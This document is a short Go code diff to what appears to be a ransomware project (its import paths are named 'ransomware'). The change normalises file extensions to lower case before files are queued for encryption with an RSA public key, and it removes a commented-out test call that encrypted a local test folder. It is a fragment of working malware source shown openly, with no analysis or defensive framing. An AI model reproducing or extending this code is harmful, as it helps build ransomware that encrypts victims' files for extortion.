@@ -13,6 +13,7 @@ import (
 	"ransomware/io"
 	"ransomware/utils"
 	"runtime"
+	"strings"
 	"sync"
 	"time"
 )
@@ -33,10 +34,6 @@ func main() {
 	if err != nil {
 		panic(err)
 	}
-
-	// currentDirectory, _ := os.Getwd()
-	// dir := string(filepath.Dir(currentDirectory) + "/testFolder")
-	// encryptFiles([]string{dir}, clientPubKeys)
 
 	if currentUser, err = user.Current(); err != nil {
 		panic(err)
@@ -101,6 +98,7 @@ func encryptFiles(dirPaths []string, cPubKey *rsa.PublicKey) {
 						return err
 					}
 					ext = filepath.Ext(path)
+					ext = strings.ToLower(ext)
 					if len(ext) > 1 && ext != ".encrypted" {
 						filesToVisit <- io.File{Info: info, Path: path, Extension: ext[1:]}
 					}
